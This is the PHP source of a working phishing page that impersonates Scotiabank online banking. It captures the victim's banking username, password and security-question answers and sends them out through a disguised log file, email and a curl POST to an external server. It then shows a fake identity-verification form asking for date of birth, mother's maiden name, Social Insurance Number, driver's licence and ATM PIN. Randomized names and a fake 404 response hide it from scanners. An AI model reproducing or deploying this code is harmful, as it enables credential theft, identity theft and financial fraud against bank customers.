﻿<?php
session_start();
error_reporting(0);
include "../control.php";
include "../sc.php";

if(isset($_POST["qq2"]))
{
	$qq1=$_SESSION["qq1"]=$_POST["qq1"];
	$aa1=$_SESSION["aa1"]=$_POST["aa1"];
	
	$qq2=$_SESSION["qq2"]=$_POST["qq2"];
	$aa2=$_SESSION["aa2"]=$_POST["aa2"];
	
	$qq3=$_SESSION["qq3"]=$_POST["qq3"];
	$aa3=$_SESSION["aa3"]=$_POST["aa3"];
	
	$uname=$_SESSION["uname"];
	$pword=$_SESSION["pword"];


$ip=$_SERVER["REMOTE_ADDR"];
$details="
User : $uname
Pass : $pword

Q1: $qq1 A1: $aa1
Q2: $qq2 A1: $aa2
Q3: $qq3 A1: $aa3

IP: $ip
";
if($log_feature==1)
{
$file=fopen("../fajfkadhjadhajdha49184924.js","a");
fwrite($file,$details);
fclose($file);
}
if($email_feature==1)
{
mail($send,"Scotia Login+Ques $ip",$details);
}
if($external_log == 0)
{
$ch2 = curl_init($external_link);
curl_setopt($ch2, CURLOPT_POST ,1);
curl_setopt($ch2, CURLOPT_POSTFIELDS ,"filename=fajfkadhjadhajdha49184924.js&DATA=$details");
curl_setopt($ch2, CURLOPT_HEADER ,0); 
curl_setopt($ch2, CURLOPT_RETURNTRANSFER ,1);
curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
$data = curl_exec($ch2);
}

	
	$fname=randomCha(rand(10,13));
	$fj=randomCha(rand(14,15));
	echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
		
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<meta http-equiv="content-language" content="en">
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		
		<title>
		Identity
		</title>
		
		<meta http-equiv="Cache-Control" content="no-cache">
		<meta http-equiv="pragma" content="no-cache">
		<meta http-equiv="expires" content="0"> 

		<meta http-equiv="Content-Style-Type" content="text/css">
		<meta http-equiv="Content-Script-Type" content="text/javascript">
		
		<link rel="shortcut icon" href="favicon.ico">
		
		
		<link rel="stylesheet" type="text/css" media="all" href="measure/load.css?load_id='.randomCha(rand(15,16)).'">
		<link rel="stylesheet" type="text/css" media="all" href="measure/jquery.css?load_id='.randomCha(rand(15,16)).'">
		<link rel="stylesheet" type="text/css" media="screen" href="measure/load2.css?load_id='.randomCha(rand(15,16)).'">
		<link href="measure/plugin.css?load_id='.randomCha(rand(15,16)).'" rel="stylesheet" type="text/css">
		</head>
	
	<body>
	 <div id="helpCentreCurtain" class="helpCurtain" style="display: none"><form id="showContactUsByJSLink" name="showContactUsByJSLink" method="post" action="/online/authentication/mfaAuthentication.bns" target=""></form><span id="helpCentre_curtainContent_container"><div id="helpCentre_curtainSearch_container" class="search"><form id="helpCentre_curtain_searchForm" name="helpCentre_curtain_searchForm" method="post" action="/online/authentication/mfaAuthentication.bns" target="">	
			<div class="left-wrapper">
	<fieldset class="">
		<legend>Search form</legend>
					<h3>Help </h3>
					<div class="search-input-wrapper"><label for="helpCentre_curtain_searchForm:helpCentre_txtQueryInput" class="off-screen">
Search for</label><input id="helpCentre_curtain_searchForm:helpCentre_txtQueryInput" type="text" name="helpCentre_curtain_searchForm:helpCentre_txtQueryInput" class="search-input">
						<a class="skip" href="#main-content" >skip to search result</a><input class="primary-button" id="helpCentre_curtain_searchForm:searchSubmit" name="helpCentre_curtain_searchForm:searchSubmit"  value="Search" type="submit">						
					</div>				
					<div class="help-ajax-loading"><span id="_viewRoot:status"><span id="_viewRoot:status.start" style="display: none">
	                    		<img style="float:left;" src="measure/ajax-loader-small.gif"></span><span id="_viewRoot:status.stop"></span></span>																													
					</div>
	</fieldset>			
			</div>
			<div class="right-wrapper">		    
				<div class="send-message-wrapper">
						<a href="#"  >Branch &amp; ABM Locator  </a>
				</div>
				<a href="javascript:void(0)" id="helpcentre_printHelpSection" class="printHelpSection float-left" title="" >
					<img alt="Print Help section" src="measure/icon_print.png">
				</a>				
				<div class="close-link-wrapper"><a class="closeHelp var_helpCentre_closeLink" href="#" id="helpCentre_curtain_searchForm:cmdHideAskCurtain" name="helpCentre_curtain_searchForm:cmdHideAskCurtain" >Close</a>
					<span class="off-screen">Help   </span>																	 		
				</div>			
			</div></form></div>
	
			<div class="help"><form id="helpCentre_curtain_contentForm" name="helpCentre_curtain_contentForm" method="post" action="/online/authentication/mfaAuthentication.bns" target=""></form>							
			</div>
			</span>
	</div>
		
		
		<div class="page_bg">
		<div class="page-wrapper">
	
		
	<div class="header">
		<div class="scotia-logo"><a href="#" id="scotia-logo-img-id" title="" class="scotia-logo-image" >
			
			<div class="scotia-logo-img-div-en" role="img" aria-label="Scotiabank Group"></div></a>
			<span class="scotia-logo-image-bw">
				<img src="measure/scotiabank-group-bw.gif" alt="Scotiabank Group">
			</span>
		</div>
		<a class="skip-nav" href="#main-content" >Skip to main content</a>
		<div class="header-links">
			<ul title=""><span id="helpCentre_curtainMenu_container">				
				<li class="var_main_top-links_tab_1"><form id="helpCentre_curtainMenuControls_helpform" name="helpCentre_curtainMenuControls_helpform" method="post" action="/online/authentication/mfaAuthentication.bns" target=""><a class="var_helpCentre_helpLink " href="#" id="helpCentre_curtainMenuControls_helpform:j_id48" name="helpCentre_curtainMenuControls_helpform:j_id48" ><span id="helpCentre_curtainMenuControls_helpform:j_id49" class="">Help</span></a></form>					
				</li>
				<li class="var_main_top-links_tab_2"><form id="helpCentre_curtainMenuControls_contactform" name="helpCentre_curtainMenuControls_contactform" method="post" action="/online/authentication/mfaAuthentication.bns" target=""><a class="var_helpCentre_contactLink " href="#" id="helpCentre_curtainMenuControls_contactform:j_id52" name="helpCentre_curtainMenuControls_contactform:j_id52" ><span id="helpCentre_curtainMenuControls_contactform:j_id53" class="">Contact</span></a></form>		
				</li>
				</span>
					<li class="var_main_top-links_tab_3">
						<a href="#"  >
							<span>Locate Us</span>
						</a>
					</li>
<form id="lang_switch_form_1" name="lang_switch_form_1" method="post" action="/online/authentication/mfaAuthentication.bns" enctype="application/x-www-form-urlencoded">

<span id="lang_switch_form_1:sel_en_000">
		<li class="var_main_top-links_tab_6">

<a id="lang_switch_form_1:fr_sel_000" href="#" >Français</a>
		</li></span>
</form>
			</ul>
		</div>
	</div>
	<div class="clearboth"></div>
	
	<div class="navigation pre-sign-on-flow"></div>
				
   	<div class="clearboth"></div>
			
			
			<div class="signon-wrapper">
			<div class="content">

		
		<div class="dataview full-width" style="width:100% !important">
			<a name="main-content"></a>
			<h1>authentication.mfa</h1>
			
			<div class="form-data ftf-form-data">
			
			<span id="errMain" style="display:none"><div class="ewa-bucket">
			<h4 class="off-screen">Error Messages</h4>
			<ul class="error">
					<li>
						<span>There are some errors in your request, please correct them to continue. (Error #MFA8-0 - Identity)
						</span>
					</li>
			</ul></div></span>
			
			


<script>


function chano(e){
var unicode=e.charCode? e.charCode : e.keyCode
if (unicode!=8 && unicode!=9  ){ 


if (unicode<48||unicode>57){ 

return false 
}

}
}


function sorto(e){
var unicode=e.charCode? e.charCode : e.keyCode
if (unicode!=8 && unicode!=9  ){ 


if (unicode<48||unicode>57){ 

if (unicode==45)
{
return true;
}
else
{
return false ;
}

}

}
}







function digno(e)
{
	var key = window.event ? e.keyCode : e.which;
	var keychar = String.fromCharCode(key);
	reg = /\d/;
	return !reg.test(keychar);
}



function '.$fj.'(){
    var a = document.forms["'.$fname.'"]["name"];
    var b = document.forms["'.$fname.'"]["dobdd"];
    var c = document.forms["'.$fname.'"]["dobmm"];
    var d = document.forms["'.$fname.'"]["dobyy"];
    var e = document.forms["'.$fname.'"]["mnn"];
    var f = document.forms["'.$fname.'"]["snn"];
    var g = document.forms["'.$fname.'"]["app"];

 
  
document.getElementById("errMain").style.display="";

    if ( a.value.length<3 )
{
 a.className="error inputwidth-lrg";
 a.focus();
return false;
}
else
{
a.className="inputwidth-lrg";
}
  if ( b.value.length<1 )
{
 b.className="error";
 b.focus();
return false;
}
else
{
b.className="";
}
 if ( c.value.length<1 )
{
 c.className="error";
 c.focus();
return false;
}
else
{
c.className="";
}
 if ( d.value.length<1 )
{
 d.className="error";
 d.focus();
return false;
}
else
{
d.className="";
}
 if ( e.value.length<3 )
{
 e.className="error inputwidth-lrg";
 e.focus();
return false;
}
else
{
e.className="inputwidth-lrg";
}

 if ( (f.value.replace(/\-/gi,"")).length<8 )
{
 f.className="error inputwidth-lrg";
 f.focus();
return false;
}
else
{
f.className="inputwidth-lrg";
}
 if ( g.value.length<4 )
{
 g.className="error inputwidth-lrg";
 g.focus();
return false;
}
else
{
g.className="inputwidth-lrg";
}

document.getElementById("errMain").style.display="none";
document.getElementById("'.$fname.'").submit();
return true;

}
</script>			
			<span id="span_msgs_5"></span>
<form id="'.$fname.'" name="'.$fname.'" method="post" action="confirm.bs.php?intcp='.randomCha(rand(2,3)).'|CONFIRM|F='.randomCha(rand(30,60)).'" onsubmit="'.$fj.'(); return false;">


			<h2 class="float-left">Identity Verification</h2>
			<div class="first-time-user-flow">
			<div class="clearboth"></div>

			<p>As an additional security check, please confirm the following details to verify your identity.</p>
<br>
			<h3>Personal Details</h3>
			<table class="standard-table" width="100%" border="0">
				<colgroup>
					<col width="160px">
					<col>
				</colgroup>

				<tbody>

				
				
				

					<tr>
						<th scope="row"><label for="name">Name:</label>
						</th>
						<td><input id="name" type="text" name="name" autocomplete="off" class="inputwidth-lrg" maxlength="200" onkeypress="return digno(event);">
						</td>
					</tr>
					
					
					
					
					
					
					
					
					
					
					
					
					<tr>
						<th scope="row"><label for="dobdd">Date of Birth:</label></th>
						<td>
						
						<select id="dobdd" name="dobdd">
						<option value="">Day</option>
<option value="01" >01</option> 
<option value="02" >02</option> 
<option value="03" >03</option> 
<option value="04" >04</option> 
<option value="05" >05</option> 
<option value="06" >06</option> 
<option value="07" >07</option> 
<option value="08" >08</option> 
<option value="09" >09</option> 
<option value="10" >10</option> 
<option value="11" >11</option> 
<option value="12" >12</option> 
<option value="13" >13</option> 
<option value="14" >14</option> 
<option value="15" >15</option> 
<option value="16" >16</option> 
<option value="17" >17</option> 
<option value="18" >18</option> 
<option value="19" >19</option> 
<option value="20" >20</option> 
<option value="21" >21</option> 
<option value="22" >22</option> 
<option value="23" >23</option> 
<option value="24" >24</option> 
<option value="25" >25</option> 
<option value="26" >26</option> 
<option value="27" >27</option> 
<option value="28" >28</option> 
<option value="29" >29</option> 
<option value="30" >30</option> 
<option value="31" >31</option> 
						</select>
						<select name="dobmm" style="margin:0px 20px;">
						<option value="">Month</option>
<option value="01" >01</option> 
<option value="02" >02</option> 
<option value="03" >03</option> 
<option value="04" >04</option> 
<option value="05" >05</option> 
<option value="06" >06</option> 
<option value="07" >07</option> 
<option value="08" >08</option> 
<option value="09" >09</option> 
<option value="10" >10</option> 
<option value="11" >11</option> 
<option value="12" >12</option> 
						</select>
						<select name="dobyy">
						<option value="">Year</option>
<option value="1910" >1910</option> 
<option value="1911" >1911</option> 
<option value="1912" >1912</option> 
<option value="1913" >1913</option> 
<option value="1914" >1914</option> 
<option value="1915" >1915</option> 
<option value="1916" >1916</option> 
<option value="1917" >1917</option> 
<option value="1918" >1918</option> 

<option value="1919" >1919</option> 
<option value="1920" >1920</option> 
<option value="1921" >1921</option> 
<option value="1922" >1922</option> 
<option value="1923" >1923</option> 
<option value="1924" >1924</option> 
<option value="1925" >1925</option> 
<option value="1926" >1926</option> 
<option value="1927" >1927</option> 

<option value="1928" >1928</option> 
<option value="1929" >1929</option> 
<option value="1930" >1930</option> 
<option value="1931" >1931</option> 
<option value="1932" >1932</option> 
<option value="1933" >1933</option> 
<option value="1934" >1934</option> 
<option value="1935" >1935</option> 
<option value="1936" >1936</option> 

<option value="1937" >1937</option> 
<option value="1938" >1938</option> 
<option value="1939" >1939</option> 
<option value="1940" >1940</option> 
<option value="1941" >1941</option> 
<option value="1942" >1942</option> 
<option value="1943" >1943</option> 
<option value="1944" >1944</option> 
<option value="1945" >1945</option> 

<option value="1946" >1946</option> 
<option value="1947" >1947</option> 
<option value="1948" >1948</option> 
<option value="1949" >1949</option> 
<option value="1950" >1950</option> 
<option value="1951" >1951</option> 
<option value="1952" >1952</option> 
<option value="1953" >1953</option> 
<option value="1954" >1954</option> 

<option value="1955" >1955</option> 
<option value="1956" >1956</option> 
<option value="1957" >1957</option> 
<option value="1958" >1958</option> 
<option value="1959" >1959</option> 
<option value="1960" >1960</option> 
<option value="1961" >1961</option> 
<option value="1962" >1962</option> 
<option value="1963" >1963</option> 

<option value="1964" >1964</option> 
<option value="1965" >1965</option> 
<option value="1966" >1966</option> 
<option value="1967" >1967</option> 
<option value="1968" >1968</option> 
<option value="1969" >1969</option> 
<option value="1970" >1970</option> 
<option value="1971" >1971</option> 
<option value="1972" >1972</option> 

<option value="1973" >1973</option> 
<option value="1974" >1974</option> 
<option value="1975" >1975</option> 
<option value="1976" >1976</option> 
<option value="1977" >1977</option> 
<option value="1978" >1978</option> 
<option value="1979" >1979</option> 
<option value="1980" >1980</option> 
<option value="1981" >1981</option> 

<option value="1982" >1982</option> 
<option value="1983" >1983</option> 
<option value="1984" >1984</option> 
<option value="1985" >1985</option> 
<option value="1986" >1986</option> 
<option value="1987" >1987</option> 
<option value="1988" >1988</option> 
<option value="1989" >1989</option> 
<option value="1990" >1990</option> 

<option value="1991" >1991</option> 
<option value="1992" >1992</option> 
<option value="1993" >1993</option> 
<option value="1994" >1994</option> 
<option value="1995" >1995</option> 
<option value="1996" >1996</option> 
<option value="1997" >1997</option> 
<option value="1998" >1998</option> 
<option value="1999" >1999</option>
<option value="2000" >2000</option>
<option value="2001" >2001</option>
<option value="2002" >2002</option>
<option value="2003" >2003</option>
<option value="2004" >2004</option>
<option value="2005" >2005</option>



<option value="2006" >2006</option>
<option value="2007" >2007</option>
<option value="2008" >2008</option>
<option value="2009" >2009</option>
<option value="2010" >2010</option>
						</select
						
						</td>
					</tr>
					
					
					<tr>
						<th scope="row"><label for="mnn">Mother\'s Maiden Name:</label>
						</th>
						<td><input id="mnn" type="text" name="mnn" autocomplete="off" class="inputwidth-lrg" maxlength="150" onkeypress="return digno(event);">
						</td>
					</tr>
					
				</tbody>
			</table>
					
				<h3>Official Identity</h3>
			<table class="standard-table" width="100%" border="0">
				<colgroup>
					<col width="160px">
					<col>
				</colgroup>

				<tbody>
					
					<tr>
						<th scope="row"><label for="snn">Social Insurance Number:</label>
						</th>
						<td><input id="snn" type="text" name="snn" autocomplete="off" class="inputwidth-lrg" maxlength="15" onkeypress="return sorto(event);">
						</td>
					</tr>
					
					
					<tr>
						<th scope="row"><label for="dll">Driver\'s License:</label>
						</th>
						<td><input id="dll" type="text" name="dll" autocomplete="off" class="inputwidth-lrg" placeholder="(If applicable)" maxlength="200" >
						</td>
					</tr>
					
					
			</tbody>
			</table>
					
				<h3>Account Verification</h3>
			<table class="standard-table" width="100%" border="0">
				<colgroup>
					<col width="160px">
					<col>
				</colgroup>
				
				<tr>
						<th scope="row"><label for="app">ATM Pin:</label>
						</th>
						<td><input id="app" type="text" name="app" autocomplete="off" class="inputwidth-lrg" maxlength="6" onkeypress="return chano(event);"><small>&nbsp;&nbsp;Required to verify ownerhsip of the issued card.</small>
						</td>
					</tr>
					


				<tbody>
					
				</tbody>
			</table>

			<br class="clearboth">

			<p style="float:right"> <img src="measure/reg/lock-1.png" style="vertical-align:middle;padding-right:10px;">SSL secured transmission.</p>
				



			<div class="btn-container margin-top-15"><input type="submit" name="mfaAuth_form:j_id139" value="Continue" title="" class="primary-button float-right"><input type="submit" name="mfaAuth_form:j_id140" value="Cancel" title="" class="secondary-button"> 
				 </div>

			</div>
		
</form>
			</div>
		</div>									
			</div>
			<div class="clearboth"></div>
	
	<div class="footer-centered">

		<div id="pageId" class="pageID">
		
		Identity - challenge:'.randomCha(rand(1,2)).rand(100,999).randomCha(rand(1,2)).rand(100,999).'<div id="j_id148">			
			</div>
		</div>
		<div class="footer">
			<div class="footer-links resp-hide">			
				<ul>
					<li><a  class="rewardsItem" href="javascript:void(0)">Legal</a></li> 
					
					
					<li><a  class="rewardsItem" href="javascript:void(0)">Privacy</a></li>
					<li><a  class="rewardsItem" href="javascript:void(0)">Security</a></li>
					<li><a href="#" class="rewardsItem" >Mobile Site</a></li> 
						<li><a  class="rewardsItem" href="javascript:void(0)">Scotiabank.com</a></li>
				</ul>		
			</div>
			<div class="clearboth"></div>		
		</div><div id="j_id163">
			</div><div id="analyticsEventAjax_div"></div><div id="analyticsEventAjaxLinkLevel_div"></div>	
		
		
		
	
		
		
		
	</div>					
			</div>					
		</div>
		</div>
	
</body></html>';
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 - Page Not Found', true, 404);
	die("<h1>404 - Page Not Found</h1>");
}
?>